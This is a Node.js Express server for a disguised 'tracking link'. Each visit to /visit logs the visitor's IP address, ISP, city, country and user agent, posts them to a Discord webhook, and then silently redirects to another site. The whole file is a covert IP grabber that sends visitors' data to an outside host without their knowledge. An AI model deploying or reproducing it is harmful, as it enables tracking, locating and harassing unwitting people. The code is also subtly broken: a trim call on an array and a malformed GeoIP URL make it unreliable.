const express = require('express');
const axios = require('axios');
const app = express();

// Pulls safely from your Render environment configuration
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK;
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/visit', async (req, res) => {
    // 1. Extract visitor IP address
    let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    if (clientIp && clientIp.includes(',')) {
        clientIp = clientIp.split(',').trim();
    }

    // Local testing fallback
    if (clientIp === '::1' || clientIp === '127.0.0.1') {
        clientIp = '8.8.8.8'; 
    }

    const userAgent = req.headers['user-agent'] || 'Unknown';

    if (DISCORD_WEBHOOK_URL) {
        try {
            // 2. Query the GeoIP API
            const geoResponse = await axios.get(`http://ip-api.com{clientIp}?fields=61439`);
            const geoData = geoResponse.data;

            // 3. Clean, Minimalist Red Embed
            const discordPayload = {
                embeds: [{
                    title: "Visitor Logged",
                    color: 15548997, // Discord Red Color
                    description: `A user has accessed the tracking link.`,
                    fields: [
                        { name: "IP Address", value: `\`${clientIp}\``, inline: true },
                        { name: "ISP Network", value: `\`${geoData.isp || "Unknown"}\``, inline: true },
                        { name: "Location", value: `\`${geoData.city || "Unknown"}, ${geoData.country || "Unknown"}\``, inline: false },
                        { name: "Device / Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false }
                    ],
                    footer: {
                        text: "System Monitor"
                    },
                    timestamp: new Date().toISOString()
                }]
            };

            // 4. Send directly to your webhook
            axios.post(DISCORD_WEBHOOK_URL, discordPayload).catch(err => {
                console.error("Webhook Delivery Failed:", err.message);
            });

        } catch (error) {
            console.error("Geo Data Retrieval Error:", error.message);
        }
    } else {
        console.warn("Configuration Error: DISCORD_WEBHOOK variable is missing.");
    }

    // 5. Instantly redirect
    res.redirect(302, REDIRECT_URL);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
